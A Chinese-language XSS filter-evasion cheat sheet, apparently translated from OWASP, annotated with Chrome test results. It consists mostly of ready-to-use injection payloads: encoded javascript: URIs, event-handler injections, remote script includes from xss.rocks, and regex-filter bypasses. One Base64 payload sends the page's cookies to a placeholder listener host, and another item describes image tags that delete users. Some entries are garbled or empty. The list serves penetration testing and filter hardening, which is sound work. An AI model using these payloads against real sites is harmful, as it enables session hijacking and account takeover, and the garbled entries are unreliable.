### 2.1. 无过滤的基本 XSS 测试

这是一个常规的 XSS 注入代码，虽然通常它会被防御，但是建议首先去测试一下。（引号在任何现代浏览器中都不需要，所以这里省略了它）：

```html
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
```

### 2.2. XSS 定位器(Polygot)

如下是一个`Polygot test XSS payload`，此测试将在多个上下文中执行，包括html，脚本字符串，js和url。感谢Gareth Heyes提出。

```html
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### 2.3. 使用 JavaScript 命令实现的图片 XSS

图片注入使用 JavaScript 命令实现（IE7.0 不支持在图片上下文中使用 JavaScript 命令， 但是可以在其他上下文触发。下面的例子展示了一种其他标签依旧通用的原理）：

```html
<IMG SRC="javascript:alert('XSS');" />
```

### 2.4. 无分号无引号

```html
<IMG SRC=javascript:alert('XSS')>
```

### 2.5. 不区分大小写的 XSS 攻击向量

```html
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

### 2.6. HTML 实体

必须有分号才可生效

```html
<IMG SRC="javascript:alert(&quot;XSS&quot;)" />
```

### 2.7. 重音符混淆

如果你的 JavaScript 代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包含 JavaScript 代码。这通常会有很大帮助，因为大部分跨站脚本过滤器都没有过滤这个字符：

```html
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```

### 2.8. 畸形的 A 标签

跳过 HREF 标签找到 XSS 的重点，由 David Cross 提交~已在 Chrome 上验证

```html
<a onmouseover="alert(document.cookie)">xxs link</a>
```

此外 Chrome 经常帮你补全缺失的引号，如果在这方面遇到问题就直接省略引号，Chrome 会帮你补全在 URL 或脚本中缺少的引号。

```html
<a onmouseover="alert(document.cookie)">xxs link</a>
```

### 2.9. 畸形的 IMG 标签

最初由 Begeek 发现（短小精湛适用于所有浏览器），这个 XSS 攻击向量使用了不严格的渲染引擎，在 IMG 标签内创建被引号括起来的攻击向量。我猜测这种解析原来是为了兼容不规范的编码。这会让它更加难以正确的解析 HTML 标签：

```html
<IMG """><script>alert("XSS")</script>">
```

### 2.10. fromCharCode 函数

如果不允许任何形式的引号，你可以通过执行 JavaScript 里的 fromCharCode 函数来创建任何你需要的 XSS 攻击向量：

```html
<IMG SRC="javascript:alert(String.fromCharCode(88,83,83))" />
```

### 2.11. 使用默认 SRC 属性绕过 SRC 域名过滤器（有效）

这种方法可以绕过大多数 SRC 域名过滤器。将 JavaScript 代码插入事件方法同样适用于注入使用 elements 的任何 HTML 标签，例如 Form, Iframe, Input, Embed 等等。它同样允许将事件替换为任何标签中可用的事件类型，例如 onblur, onclick。下面会给出许多不同的可注入事件列表。由 David Cross 提交，Abdullah Hussam(@Abdulahhusam)编辑。

```html
<IMG SRC="#" onmouseover="alert('xxs')" />
```

### 2.12. 使用默认为空的 SRC 属性（无效）

```html
<IMG SRC= onmouseover="alert('xxs')">
```

### 2.13. 不使用 SRC 属性

通过 css 设置 IMG 大小达到可 mouseover 的情况，方有效。

```html
<IMG onmouseover="alert('xxs')" />
```

### 2.14. 通过 error 事件触发 alert（有效）

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></IMG>
```

### 2.15. 使用 IMG 标签中 onerror 属性并对 alert 进行编码（有效）

```html
<IMG SRC=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

### 2.16. 十进制 HTML 字符实体编码

所有在 IMG 标签里直接使用`javascript:`形式的 XSS 示例无法在 Firefox 或 Netscape 8.1 以上浏览器（使用 Gecko 渲染引擎）运行。

```html
<IMG
  SRC="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;"
  &#39;&#88;&#83;&#83;&#39;&#41;
/>
```

### 2.17. 不带分号的十进制 HTML 字符实体编码

```html
<IMG
  SRC="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&"
  #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041
/>
```

### 2.18. 不带分号的十六进制 HTML 字符实体编码

```html
<IMG
  SRC="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29"
/>
```

### 2.19. 内嵌 TAB

```html
<IMG SRC="jav	ascript:alert('XSS');" />
```

### 2.20. 内嵌编码后的TAB分隔XSS代码

```html
<IMG SRC="jav&#x09;ascript:alert('XSS');" />
```

### 2.21. 内嵌换行分隔XSS代码

一些网站声称 09 到 13（十进制）的 HTML 实体字符都可以实现这种攻击，这是不正确的。只有 09（TAB），10（换行）和 13（回车）有效。查看 ASCII 字符表获取更多细节。下面几个 XSS 示例介绍了这些向量。

```html
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
```

### 2.22. 内嵌回车分隔XSS代码

（注意：上面我使用了比实际需要更长的字符串是因为 0 可以忽略。经常可以遇到过滤器解码十六进制和十进制编码时认为只有 2 到 3 字符。实际规则是 1 至 7 位字符）

```html
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```

### 2.23. 使用空字符分隔JavaScript指令

空字符同样可以作为 XSS 攻击向量，但和上面有所区别，你需要使用一些例如 Burp 工具 或在 URL 字符串里使用%00，亦或你想使用 VIM 编写自己的注入工具（^V^@会生成空 字符），还可以通过程序生成它到一个文本文件。老版本的 Opera 浏览器（例如 Windows 版的 7.11）还会受另一个字符 173（软连字符）的影响。但是空字符%00 更加有用并且能帮助绕过真实世界里的过滤器，例如这个例子里的变形：

```html
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```

### 2.24. 利用IMG标签中JavaScript代码前的空格以及元字符

如果过滤器不计算"javascript:"前的空格，这是正确的，因为它们不会被解析，但这点非常有用。因为这会造成错误的假设，就是引号和"javascript:"字样间不能有任何字符。实际情况是你可以插入任何十进制的 1 至 32 号字符：

```html
<IMG SRC=" &#14;  javascript:alert('XSS');">
```

### 2.25. 利用非字母非数字的字符

FireFox 的 HTML 解析器认为 HTML 关键词后不能有非字母非数字字符，并且认为这是一个空白或在 HTML 标签后的无效符号。但问题是有的 XSS 过滤器认为它们要查找的标记会被空白字符分隔。例如"<SCRIPT\s" != "<SCRIPT/XSS\s":

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```

基于上面的原理，可以使用模糊测试进行扩展。Gecko 渲染引擎允许任何字符包括字母， 数字或特殊字符（例如引号，尖括号等）存在于事件名称和等号之间，这会使得更加容易绕过跨站脚本过滤。注意这同样适用于下面看到的重音符:

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

Yair Amit 让我注意到了 IE 和 Gecko 渲染引擎有一点不同行为，在于是否在 HTML 标签和参数之间允许一个不含空格的斜杠。如果系统不允许空格的时候，这会非常有用。

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```

### 2.26. 额外的尖括号

由 Franz Sedlmaier 提交，这个 XSS 攻击向量可以绕过某些检测引擎，比如先查找第一个匹配的尖括号，然后比较里面的标签内容，而不是使用更有效的算法，例如 Boyer-Moore 算法就是查找整个字符串中的尖括号和相应标签（当然是通过模糊匹配）。双斜杠注释了额外的尖括号来防止出现 JavaScript 错误：

```html
<<SCRIPT>alert("XSS");//<</SCRIPT>
```

### 2.27. 未闭合的script标签

在 Firefox 和 Netscape 8.1 的 Gecko 渲染引擎下你不是必须构造类似“></SCRIPT>” 的跨站脚本攻击向量。Firefox 假定闭合 HTML 标签是安全的并且会为你添加闭合标记。多么体贴！不像不影响 Firefox 的下一个问题，这不需要在后面有额外的 HTML 标签。如果需要可以添加引号，但通常是没有必要的，需要注意的是，我并不知道这样注入后 HTML 会什么样子结束:

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```

### 2.28. script标签中的协议解析

这个特定的变体是由 Łukasz Pilorz 提交的，并且基于 Ozh 提供的协议解析绕过。这个跨站脚本示例在 IE 和 Netscape 的 IE 渲染模式下有效，如果添加了</SCRIPT>标记在 Opera 中也可以。这在输入空间有限的情况下是非常有用的，你所使用的域名越短越好。".j"是可 用的，在 SCRIPT 标签中不需要考虑编码类型因为浏览器会自动识别。

```html
<SCRIPT SRC=//xss.rocks/.j>
```

### 2.29. 只含左尖括号的HTML/JavaScript XSS向量

IE 渲染引擎不像 Firefox，不会向页面中添加额外数据。但它允许在 IMG 标签中直接使用 javascript。这对构造攻击向量是很有用的，因为不需要闭合尖括号。这使得有任何 HTML 标签都可以进行跨站脚本攻击向量注入。甚至可以不使用">"闭合标签。注意：这会让 HTML 页面变得混乱，具体程度取决于下面的 HTML 标签。这可以绕过以下 NIDS 正则: /((\%3 D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/因为不需要">"闭合。另外在实际对抗 XSS 过滤器的时候，使用一个半开放的<IFRAME 标签替代<IMG 标签也是非常有效的。

```html
<IMG SRC="javascript:alert('XSS')"
```

### 2-30 双尖括号<（chrome 即可测试）

在正常标签后面使用一个左尖括号< 代替 右尖括号>，就可以用远程脚本攻击正常页面，比如直接用远程攻击脚本内容代替正常页面上的表单，从而直接获取用户提交的信息。没有左尖括号时，在 Firefox 中生效，而在 Netscape 中无效。

`<iframe SRC=http://xss.rocks/scriptlet.html <`

### 2-31 javascript 双重转义

当应用将一些用户输入输出到例如：<SCRIPT>var a=”\$ENV{QUERY_STRING}”;</SCRIPT>的 JavaScript 中时，你想注入你的 JavaScript 脚本，你可以通过转义转义字符来规避服务器端转义引号。注入后会得到<SCRIPT>vara=”\\”;alert(‘XSS’);//”;</SCRIPT>，这时双引号不会被转义并且可以触发跨站脚本攻击向量。XSS 定位器就用了这种方法:

`\";alert('XSS');//`

另一种方法是，直接使用 script 闭合标签，并开始自己的 script 脚本块：

`</script><script>alert('XSS');</script>`

### 2-32 </TITLE>（chrome 即可测试）

这是一个简单的闭合<TITLE>标签的 XSS 攻击向量，可以包含恶意的跨站脚本攻击:

`</TITLE><SCRIPT>alert("XSS");</SCRIPT>`

### 2-33 INPUT 标签中设置 image（chrome 测试无效）

`<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`

### 2-34 BODY 标签中设置 image（chrome 测试无效）

`<BODY BACKGROUND="javascript:alert('XSS')">`

### 2-35 IMG 标签的 Dynsrc 属性（chrome 测试无效）

`<IMG DYNSRC="javascript:alert('XSS')">`

`（注意：该属性只在IE和Netscape中支持，img dynsrc可以用来插入各种多媒体，格式可以是Wav、Avi、AIFF、AU、MP3、Ra、Ram等等）`

### 2-36 IMG 标签的 lowsrc 属性（chrome 测试无效）

`<IMG LOWSRC="javascript:alert('XSS')">`

`（注意：该属性用于设置低分辨率下的图片）`

### 3-37 列表样式设置图片（chrome 测试无效）

使用 JavaScript 伪协议在列表 List 中嵌入图片，这种情况只在 IE 浏览器中有用

`<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`

### 2-38 图片标签中使用 VBscript 片（chrome 测试无效）

`<IMG SRC='vbscript:msgbox("XSS")'>`

`（注意：在 IE 中除了支持 JavaScript 外，还支持 VBScript,但是 Firefox、Chrome 中是不支持 VBScript 的）`

### 2-39 Livescript（chrome 测试无效,仅限旧版本的 Netscape 浏览器）

`<IMG SRC="livescript:[code]">`

`（注意：LiveScript是JavaScript语言的前身）`

### 2-40 Svg 对象标签 (chrome 测试生效)

`<svg/onload=alert('XSS')>`

### 2-41 es6 (chrome 测试无效)

`Set.constructor`alert\x28document.domain\x29``

### 2-42 body 标签 (chrome 测试生效)

`<BODY ONLOAD=alert('XSS')>`

### 2-43 事件处理程序

### 2-44 BGSOUND (chrome 测试无效)

`<bgsound>是IE浏览器中设置网页背景音乐的元素。该特性是非标准的，请尽量不要在生产环境中使用它！`

### 2-45 & JavaScript includes (chrome 测试无效)

`<BR SIZE="&{alert('XSS')}">`

### 2-46 stylesheet 样式表引入 (chrome 测试无效)

`<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`

### 2-47 远程样式表 （chrome 测试无效）

`<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">`

### 2-48 远程样式表 2 (chrome 测试无效)

`<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`

### 2-49 远程样式表 3 （chrome 测试无效）

`<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">`

### 2-50 远程样式表 4 (chrome 测试无效)

`<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`

### 2-51 含有分隔 JavaScript 的STYLE标签

这个 XSS 会在 IE 中造成无限循环:

```html
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```

### 2-52 STYLE 属性中使用注释分隔表达式

由 Roman Ivanov 创建

```html
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```

### 2-53 含有表达式的IMG标签的STYLE属性

这是一个将上面 XSS 攻击向量混合的方法，但确实展示了 STYLE 标签可以用相当复杂的方式分隔，和上面一样，也会让 IE 进入死循环:

```html
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```

### 2-54 STYLE标签（仅旧版本Netscape可用）

```html
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
```

### 2-55 使用背景图像的STYLE标签

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```

### 2-56 使用背景的STYLE标签

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
```

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
```

### 2-57 含有STYLE属性的任意HTML标签

IE6.0 和 IE 渲染引擎模式下的 Netscape 8.1+并不关心你建立的 HTML 标签是否存在，只要是由尖括号和字母开始的即可:

```html
<XSS STYLE="xss:expression(alert('XSS'))">
```

### 2-58 本地htc文件

这和上面两个跨站脚本攻击向量有些不同，因为它使用了一个必须和 XSS 攻击向量在相同服务器上的.htc 文件。这个示例文件通过下载 JavaScript 并将其作为 style 属性的一部分运行来进行攻击：

```html
<XSS STYLE="behavior: url(xss.htc);">
```

### 2-59 US-ASCII encoding

US-ASCII 编码（由 Kurt Huwig 发现）。它使用了畸形的 7 位 ASCII 编码来代替 8 位。这 个 XSS 攻击向量可以绕过大多数内容过滤器，但是只在主机使用 US-ASCII 编码传输数据时有效，或者可以自己设置编码格式。相对绕过服务器端过滤，这在绕过 WAF 跨站脚本过滤时候更有效。Apache Tomcat 是目前唯一已知使用 US-ASCII 编码传输的：

```html
¼script¾alert(¢XSS¢)¼/script¾
```

### 2-60 META

META 标签可以设置刷新，这个刷新功能比较奇怪的是并不会在头部中发送一个 referrer，所以它通常用于不需要 referrer 的时候:

比如下面的刷新跳转在 chrome 中可以生效：

`<meta http-equiv="Refresh" content="3;url=http://www.haishui.NET">`

比如下面的刷新已经被 chrome 拦截，并不会发生：

`<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`

#### 2-60-1 使用编码数据的 META

URL scheme 指令。这个非常有用因为它并不包含任何可见的 SCRIPT 单词或 JavaScript 指令,因为它使用了 base64 编码.请查看 RFC 2397 寻找更多细节。你同样可以使用具有 Base64 编码功能的 XSS 工具来编码 HTML 或 JavaScript:

`<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`

`（注意：chrome浏览器已经拦截data形式的刷新）`

#### 2-60-2 含有额外 URL 参数的 META

如果目标站点尝试检查 URL 是否包含"http://"，你可以用以下技术规避它(由 Moritz Naumann 提交):

`<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert ('XSS');">`

`（注意：在chrome中，会发生刷新，刷新到空白页about:blank，javascript指令alert事件并不会发生）`

### 2-61 IFRAME（chrome 即可测试）

如果可以使用 Iframe，也会有很多 XSS 问题:

`<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`

### 2-62 基于事件 IFRAME（chrome 即可测试）

Iframes 和大多数其他元素可以使用下列事件(由 David Cross 提交):

`<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`

### 2-63 FRAME（chrome 即可测试）

Frames 和 iframe 一样有很多 XSS 问题:
`

<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`

`（注意：FRAMESET标签不能和body标签一起使用）`

### 2-64 TABLE（chrome 测试无效）

`<TABLE BACKGROUND="javascript:alert('XSS')">`

#### 2-64-1 TD（chrome 测试无效）

和上面一样，TD 也可以通过 BACKGROUND 来包含 JavaScript XSS 攻击向量:

`<TABLE><TD BACKGROUND="javascript:alert('XSS')">`

### 2-65 DIV

#### 2-65-1 DIV 背景图像（chrome 测试无效）

`<DIV STYLE="background-image: url(javascript:alert('XSS'))">`

#### 2-65-2 使用 Unicode XSS 代码设置 DIV 背景图像（chrome 测试无效）

这进行了一些修改来混淆 URL 参数。原始的漏洞是由 Renaud Lifchitz 在 Hotmail 发现的:

`<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">`

#### 2-65-3 含有额外字符的 DIV 背景图像（chrome 测试无效）

Rnaske 进行了一个快速的 XSS 模糊测试来发现 IE 和安全模式下的 Netscape 8.1 中任何 可以在左括号和 JavaScript 指令间加入的额外字符。这都是十进制的但是你也可以使用十 六进制来填充(以下字符可用:1-32, 34, 39, 160, 8192-8.13, 12288, 65279):

`<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">`

`（注意：chrome测试的时候，均提示css属性值不对，chrome测试均无效）`

#### 2-65-4 DIV 表达式（chrome 测试无效）

一个非常有效的对抗现实中的跨站脚本过滤器的变体是在冒号和"expression"之间添加一个换行:

`<DIV STYLE="width: expression(alert('XSS'));">`

### 2-66 html 条件选择注释块（chrome 测试无效，尽在 IE5.0 及更高版本和 IE 渲染引擎模式下的 Netscape 8.1 生效）

只能在 IE5.0 及更高版本和 IE 渲染引擎模式下的 Netscape 8.1 生效。一些网站认为在注释 中的任何内容都是安全的并且认为没有必要移除，这就允许我们添加跨站脚本攻击向量。系 统会在一些内容周围尝试添加注释标签以便安全的渲染它们。如我们所见，这有时并不起作用:

`<!--[if gte IE 4]>

 <SCRIPT>alert('XSS');</SCRIPT>

<![endif]-->`

### 2-67 BASE 标签（chrome 测试并不会弹出 alert）

在 IE 和安全模式下的 Netscape 8.1 有效。你需要使用//来注释下个字符，这样你就不会造 成 JavaScript 错误并且你的 XSS 标签可以被渲染。同样，这需要当前网站使用相对路径例如"images/image.jpg"来放置图像而不是绝对路径。如果路径以一个斜杠开头例如 "/images/image.jpg"你可以从攻击向量中移除一个斜杠(只有在两个斜杠时注释才会生效):

`<BASE HREF="javascript:alert('XSS');//">`

`（注意：<base> 标签为页面上的所有链接规定默认地址或默认目标。）`

### 2-68 OBJECT 标签（chrome 即可测试）

如果允许使用 OBJECT，你可以插入一个 xss 攻击变量来攻击用户，类似于 APPLET 标签。链接文件实际是含有你 XSS 攻击代码的 HTML 文件:

`<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>`

### 2-69 使用 EMBED 标签加载含有 XSS 的 FLASH 文件

下面有一个例子,如果你添加了属性 allowScriptAccess="never"以及 allownetworking="internal"则可以 减小风险(感谢 Jonathan Vanasco 提供的信息):

`<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).: org/xss.swf" AllowScriptAccess="always"></EMBED>`

### 2-70 使用 EMBED SVG 包含攻击向量（chrome 即可测试）

该示例只在 FireFox 下有效，但是比上面的攻击向量在 FireFox 下好，因为不需要用户安装 或启用 FLASH。感谢 nEUrOO 提供:

`<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`

### 2-71 在 FLASH 中使用 ActionScript 混淆 XSS 攻击向量(暂时未测试)

`a="get"; b="URL(\""; c="javascript:"; d="alert('XSS');\")"; eval(a+b+c+d);`

### 2-72 CDATA 混淆的 XML 数据岛（只在 IE 和使用 IE 渲染模式的 Netscape 8.1 下有效）

这个 XSS 攻击只在 IE 和使用 IE 渲染模式的 Netscape 8.1 下有效-攻击向量由 Sec Consult 在审计 Yahoo 时发现

`<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML> <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>`

### 2-73 使用 XML 数据岛生成含内嵌 JavaScript 的本地 XML 文件（只在 IE 和使用 IE 渲染模式的 Netscape 8.1 下有效）

这和上面是一样的,但是将来源替换为了包含跨站脚本攻击向量的本地 XML 文件(必须在同一服务器上):

`<XML SRC="xsstest.xml" ID=I></XML> <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>`

### 2-74 XML 中使用 HTML+TIME（只在 IE 和 IE 渲染模式下的 Netscape 8.1 有效）

这是 Grey Magic 攻击 Hotmail 和 Yahoo 的方法。这只在 IE 和 IE 渲染模式下的 Netscape 8.1 有效并且记得需要在 HTML 域的 BODY 标签中间才有效:

### 2-75 使用一些字符绕过".js"过滤

你可以将你的 JavaScript 文件重命名为图像来进行 XSS 攻击:

`<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>`

### 2-76 SSI(Server Side Includes)

这需要在服务器端允许 SSI 来使用 XSS 攻击向量。似乎不用提示这点，因为如果你可以在 服务器端执行指令那一定是有更严重的问题存在:

`<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->`

### 2-77 PHP

需要服务器端安装了 PHP 来使用 XSS 攻击向量。同样，如果你可以远程运行任意脚本，那 会有更加严重的问题

`<? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?>`

### 2-78 嵌入命令的 IMAGE

当页面受密码保护并且这个密码保护同样适用于相同域的不同页面时有效，这可以用来进行 删除用户，增加用户(如果访问页面的是管理员的话)，将密码发送到任意地方等等。。这 是一个较少使用但是更有价值的 XSS 攻击向量:

`<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">`

### 2-78-1 嵌入命令的 IMAGE 第二部分

这更加可怕因为这不包含任何可疑标识，除了它不在你自己的域名上。这个攻击向量使用一个 302 或 304(其他的也有效)来重定向图片到指定命令。所以一个普通的<IMG SRC="httx://badguy.com/a.jpg">对于访问图片链接的用户来说也有可能是一个攻击向 量。下面是利用.htaccess(Apache)配置文件来实现攻击向量。(感谢 Timo 提供这部分。):

`Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser`

### 2-79 Cookie 篡改

尽管公认不太实用，但是还是可以发现一些允许使用 META 标签的情况下可用它来覆写 cookie。另外的例子是当用户访问网站页面时，一些网站读取并显示存储在 cookie 中的用户名，而不是数据库中。当这两种场景结合时，你可以修改受害者的 cookie 以便将 JavaScript 注入到其页面中(你可以使用这个让用户登出或改变他们的用户状态，甚至可以 让他们以你的账户登录):

`<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">`

`(注意：chrome已经拦截该形式)`

### 2-80 UTF-7 编码

如果存在 XSS 的页面没有提供页面编码头部，或者使用了任何设置为使用 UTF-7 编码的浏 览器，就可以使用下列方式进行攻击(感谢 Roman Ivanov 提供)。这在任何不改变编码类 型的现代浏览器上是无效的，这也是为什么标记为完全不支持的原因。Watchfire 在 Google 的自定义 404 脚本中发现这个问题:

`<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`

### 2.81 利用 HTML 引号包含的 XSS

注：源文章内容出现为 httx 的字符，测试改为 http

这在 IE 中测试通过，但还得视情况而定。
它是为了绕过那些允许`<SCRIPT>`但是不允许`<SCRIPT SRC...`形式的正则过滤，即`/<script[^>]+SRC/i`：

(有效)

```html
<script a=">" SRC="httx://xss.rocks/xss.js"></script>
```

---

这是为了绕过那些允许 `<SCRIPT>` 但是不允许 `<SCRIPT SRC...` 形式的正则过滤，即`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)SRC/i`（这很重要，因为在实际环境中出现过这种正则过滤）
(无效)

```html
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

另一个绕过此正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*) SRC/i`的 XSS：
(有效)

```html
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

又一个绕过正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)sr c/i`的 XSS。尽管不想提及防御方法，但如果你想允许`<SCRIPT>`标签但不加载远程脚本，针对这种 XSS 只能使用状态机去防御（当然如果允许`<SCRIPT>`标签的话，还有其他方法绕过）：
(有效)

```html
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

最后一个绕过此正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\ s*)SRC/i`的 XSS，使用了重音符（在 Firefox 下无效）：
(无效)

```html
<script a="`">
  ` SRC="httx://xss.rocks/xss.js">
</script>
```

---

这是一个 XSS 样例，用来绕过那些不会检查引号配对，而是发现任何引号就立即结束参数字符串的正则表达式：
(有效)

```html
<script a=">'>" SRC="httx://xss.rocks/xss.js"></script>
```

---

这个 XSS 很让人担心，因为如果不过滤所有活动内容几乎不可能防止此攻击：
(有效)

```html
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

### 2.82 URL 字符绕过

假定"http://www.google.com/"是不被允许的：

(应换成当前 google 对应的 ip，此处原文 ip 地址 已失效，demo 以 google 域名对应 即时 ip 及其编码为准-海秋)

#### 2.82.1. IP 代替域名(有效)

```html
<a href="http://66.102.7.147/">XSS</a>
```

#### 2.82.2. URL 编码(有效)

```html
<a href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</a>
```

#### 2.82.3. 双字节编码(未测试)

(注意：还有另一种双字节编码):

```html
<a href="http://1113982867/">XSS</a>
```

#### 2.82.4. 十六进制编码(有效)

每个数字的允许的范围大概是 240 位字符，就如你在第二位上看到的，并且由于十六进制 是在 0 到 F 之间，所以开头的 0 可以省略：

```html
<a href="http://0x42.0x0000066.0x7.0x93/">XSS</a>
```

#### 2.82.5. 八进制编码(有效)

又一次允许填充，尽管你必须保证每类在 4 位字符以上-例如 A 类，B 类等等：

```html
<a href="http://0102.0146.0007.00000223/">XSS</a>
```

#### 2.82.6. Base64 编码(无效)

```html
<IMG
  onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))"
/>
```

#### 2.82.7. 混合编码(无效)

混合基本编码并在其中插入一些 TAB 和换行(虽然不知道浏览器为什么允许这样做)。

TAB 和换行只有被引号包含时才有效：

```html
<a
  href="h
tt p://6 6.000146.0x7.147/"
  >XSS</a
>
```

#### 2.82.8. 协议解析绕过(有效)

(// 替代 http://可以节约很多字节).当输入空间有限时很有用(少两个字符可能解决大问题) 而且可以轻松绕过类似"(ht|f)tp(s)?://"的正则过滤(感谢 Ozh 提供这部分).你也可以将"//" 换成"\\"。你需要保证斜杠在正确的位置，否则可能被当成相对路径 URL：

```html
<a href="//www.google.com/">XSS</a>
```

#### 2.82.9. Google 的"feeling lucky" part 1

Firefox 使用 Google 的"feeling lucky"功能根据用户输入的任何关键词来让用户跳转到其认为最可能的网站。如果你存在漏洞的页面在某些随机关键词上搜索引擎排名是第一的，你就可以利用这一特性来攻击 Firefox 用户。这使用了 Firefox 的"keyword:"协议。你可以像下面一样使用多个关键词"keyword:XSS+RSnake"。这在 Firefox2.0 后不再有效。

```html
<a href="//google">XSS</a>
```

#### 2.82.10. Google 的"feeling lucky" part 2

